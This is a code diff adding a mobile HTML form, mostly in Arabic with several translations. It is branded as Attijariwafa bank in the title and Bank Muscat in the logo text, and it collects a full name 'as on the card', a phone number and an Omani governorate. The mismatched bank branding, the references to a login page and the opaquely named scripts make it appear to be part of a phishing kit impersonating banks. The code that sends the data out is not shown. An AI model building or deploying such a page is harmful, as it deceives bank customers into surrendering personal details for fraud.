@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Attijariwafa bank - Saisie des informations</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-coral: #FF6B4A;
+            --background-dark: #0F1419;
+            --card-bg: #1A2332;
+            --card-bg-light: #2D3E52;
+            --text-white: #FFFFFF;
+            --text-muted: #6B7280;
+            --spacing-4: 4px;
+            --spacing-8: 8px;
+            --font-primary: 'Cairo', 'Poppins', sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            font-family: var(--font-primary);
+            background-color: var(--background-dark);
+            color: var(--text-white);
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--background-dark);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            background-color: var(--background-dark);
+            height: 70px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo { width: 60px; height: auto; object-fit: contain; }
+        .lang-toggle-btn {
+            font-size: 15px;
+            font-weight: 600;
+            color: #FF6B4A;
+            background: none;
+            border: 1.5px solid #FF6B4A;
+            border-radius: 20px;
+            padding: 5px 14px;
+            cursor: pointer;
+            font-family: var(--font-primary);
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        .lang-toggle-btn:active { background: rgba(255,107,74,0.1); }
+        .header-spacer { width: 80px; }
+
+        .form-section {
+            padding: 30px 20px;
+            flex-grow: 1;
+            padding-bottom: 30px;
+        }
+
+        .welcome-text { text-align: center; margin-bottom: 30px; }
+        .welcome-text h2 { font-size: 24px; font-weight: 700; color: var(--text-white); margin-bottom: 8px; }
+        .welcome-text p { font-size: 14px; color: var(--text-muted); }
+
+        .input-group { margin-bottom: 20px; }
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-white);
+            margin-bottom: 8px;
+            padding-inline-start: 5px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 16px;
+            background: var(--card-bg-light);
+            color: var(--text-white);
+            font-family: var(--font-primary);
+            transition: all 0.3s ease;
+        }
+        .input-field::placeholder { color: var(--text-muted); }
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-coral);
+            box-shadow: 0 0 0 3px rgba(255, 107, 74, 0.1);
+        }
+        select.input-field {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='white'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 15px center;
+            background-size: 20px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: not-allowed;
+            font-family: var(--font-primary);
+            transition: all 0.3s ease;
+            opacity: 0.5;
+            pointer-events: none;
+            color: white;
+            background-color: var(--primary-coral);
+            margin-top: 20px;
+        }
+        .submit-btn.active { opacity: 1; cursor: pointer; pointer-events: auto; }
+        .submit-btn.active:active { transform: scale(0.98); }
+
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background-color: rgba(15, 20, 25, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #loadingOverlay.show { display: flex; }
+        .spinner {
+            width: 40px; height: 40px;
+            border: 4px solid rgba(255, 107, 74, 0.2);
+            border-top: 4px solid var(--primary-coral);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Bottom Nav (identical to login.html) ── */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 480px;
+            height: 70px;
+            background-color: var(--background-dark);
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 8px 0;
+            z-index: 100;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            color: var(--text-muted);
+            font-size: 11px;
+            font-weight: 600;
+            font-family: var(--font-primary);
+            flex: 1;
+            background: none;
+            border: none;
+            cursor: pointer;
+            transition: color 200ms ease-out;
+            text-decoration: none;
+        }
+        .nav-item svg { width: 24px; height: 24px; }
+        .nav-item:active { color: var(--primary-coral); }
+        .nav-item.active { color: var(--primary-coral); }
+
+        @media (max-width: 480px) {
+            .form-section { padding: 20px 15px 30px; }
+        }
+    </style>
+</head>
+<body>
+<div class="phone-container">
+    <div class="header">
+        <div class="header-spacer"></div>
+        <img src="logoapp.png" alt="بنك مسقط" class="logo">
+        <button class="lang-toggle-btn" id="langToggleBtn" onclick="toggleLangReg()">English</button>
+    </div>
+
+    <div class="form-section">
+        <div class="welcome-text">
+            <h2 data-ar="أدخل بياناتك" data-fr="Saisir vos informations" data-en="Enter your information"
+                data-es="Ingrese su información" data-de="Geben Sie Ihre Daten ein"
+                data-nl="Voer uw gegevens in" data-it="Inserisci le tue informazioni">
+                أدخل بياناتك
+            </h2>
+            <p data-ar="يرجى ملء جميع الحقول المطلوبة" data-fr="Veuillez remplir tous les champs requis"
+               data-en="Please fill in all required fields" data-es="Por favor complete todos los campos requeridos"
+               data-de="Bitte füllen Sie alle erforderlichen Felder aus"
+               data-nl="Vul alle verplichte velden in" data-it="Si prega di compilare tutti i campi richiesti">
+                يرجى ملء جميع الحقول المطلوبة
+            </p>
+        </div>
+
+        <div class="input-group">
+            <label for="fullName" class="input-label"
+                data-ar="الاسم الكامل" data-fr="Nom complet" data-en="Full Name"
+                data-es="Nombre completo" data-de="Vollständiger Name"
+                data-nl="Volledige naam" data-it="Nome completo">
+                الاسم الكامل
+            </label>
+            <input type="text" id="fullName" class="input-field"
+                placeholder="أدخل اسمك الكامل كما في البطاقة"
+                data-ar-placeholder="أدخل اسمك الكامل كما في البطاقة"
+                data-fr-placeholder="Entrez votre nom complet tel qu'il figure sur la carte"
+                data-en-placeholder="Enter your full name as on the card"
+                data-es-placeholder="Ingrese su nombre completo como en la tarjeta"
+                data-de-placeholder="Geben Sie Ihren vollständigen Namen wie auf der Karte ein"
+                data-nl-placeholder="Voer uw volledige naam in zoals op de kaart"
+                data-it-placeholder="Inserisci il tuo nome completo come sulla carta"
+                required>
+        </div>
+
+        <div class="input-group">
+            <label for="phoneNumber" class="input-label"
+                data-ar="رقم الهاتف" data-fr="Numéro de téléphone" data-en="Phone Number"
+                data-es="Número de teléfono" data-de="Telefonnummer"
+                data-nl="Telefoonnummer" data-it="Numero di telefono">
+                رقم الهاتف
+            </label>
+            <input type="tel" id="phoneNumber" class="input-field"
+                placeholder="9XXXXXXX"
+                data-ar-placeholder="9XXXXXXX"
+                data-fr-placeholder="9XXXXXXX"
+                data-en-placeholder="9XXXXXXX"
+                data-es-placeholder="9XXXXXXX"
+                data-de-placeholder="9XXXXXXX"
+                data-nl-placeholder="9XXXXXXX"
+                data-it-placeholder="9XXXXXXX"
+                maxlength="8" required>
+        </div>
+
+        <div class="input-group">
+            <label for="address" class="input-label"
+                data-ar="المحافظة" data-fr="Gouvernorat" data-en="Governorate"
+                data-es="Gobernación" data-de="Gouvernement"
+                data-nl="Gouvernement" data-it="Governatorato">
+                المحافظة
+            </label>
+            <select id="address" class="input-field" required>
+                <option value="" disabled selected
+                    data-ar="اختر محافظتك" data-fr="Choisissez votre gouvernorat" data-en="Choose your governorate"
+                    data-es="Elige tu gobernación" data-de="Wählen Sie Ihr Gouvernement"
+                    data-nl="Kies uw gouvernement" data-it="Scegli il tuo governatorato">
+                    اختر محافظتك
+                </option>
+                <option value="مسقط">مسقط - Muscat</option>
+                <option value="ظفار">ظفار - Dhofar</option>
+                <option value="مسندم">مسندم - Musandam</option>
+                <option value="البريمي">البريمي - Al Buraimi</option>
+                <option value="الباطنة شمال">الباطنة شمال - Al Batinah North</option>
+                <option value="الباطنة جنوب">الباطنة جنوب - Al Batinah South</option>
+                <option value="الداخلية">الداخلية - Ad Dakhiliyah</option>
+                <option value="الظاهرة شمال">الظاهرة شمال - Az Zahirah North</option>
+                <option value="الظاهرة جنوب">الظاهرة جنوب - Az Zahirah South</option>
+                <option value="الشرقية شمال">الشرقية شمال - Ash Sharqiyah North</option>
+                <option value="الشرقية جنوب">الشرقية جنوب - Ash Sharqiyah South</option>
+                <option value="الوسطى">الوسطى - Al Wusta</option>
+            </select>
+        </div>
+
+        <button type="button" class="submit-btn" id="submitBtn" disabled
+            data-ar="تأكيد البيانات"
+            data-fr="Confirmer les informations"
+            data-en="Confirm Information"
+            data-es="Confirmar información"
+            data-de="Informationen bestätigen"
+            data-nl="Informatie bevestigen"
+            data-it="Conferma informazioni">
+                تأكيد البيانات
+        </button>
+    </div>
+
+
+</div>
+
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+    <h3 style="font-size: 18px; font-weight: 700;"
+        data-ar="جاري المعالجة..."
+        data-fr="Traitement en cours..."
+        data-en="Processing..."
+        data-es="Procesando..."
+        data-de="Verarbeitung..."
+        data-nl="Verwerking..."
+        data-it="Elaborazione...">
+        جاري المعالجة...
+    </h3>
+    <p style="font-size: 14px; color: var(--text-muted); margin-top: 8px;"
+        data-ar="يرجى الانتظار لحظة"
+        data-fr="Veuillez patienter un instant"
+        data-en="Please wait a moment"
+        data-es="Por favor espere un momento"
+        data-de="Bitte warten Sie einen Moment"
+        data-nl="Een ogenblik geduld"
+        data-it="Attendere un momento">
+        يرجى الانتظار لحظة
+    </p>
+</div>
+
+<script src="js/lang.js"></script>
+<script>
+    // Apply saved language on load
+    document.addEventListener('DOMContentLoaded', function() {
+        if (window.LangNav) {
+            window.LangNav.init({
+                setupNav: false,
+                setupMenu: false,
+                setupLangPage: false
+            });
+            var lang = localStorage.getItem('language') || 'ar';
+            window.LangNav.updateLanguage(lang);
+        }
+        updateLangToggleBtnReg();
+    });
+
+    // ── Language Toggle Button ──
+    function toggleLangReg() {
+        var current = window.LangNav ? window.LangNav.getCurrentLanguage() : (localStorage.getItem('language') || 'ar');
+        var next = (current === 'ar') ? 'en' : 'ar';
+        if (window.LangNav) window.LangNav.updateLanguage(next);
+        updateLangToggleBtnReg();
+    }
+    function updateLangToggleBtnReg() {
+        var lang = window.LangNav ? window.LangNav.getCurrentLanguage() : (localStorage.getItem('language') || 'ar');
+        var btn = document.getElementById('langToggleBtn');
+        if (btn) btn.textContent = (lang === 'ar') ? 'English' : 'عربي';
+    }
+</script>
+<script src="js/a1.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
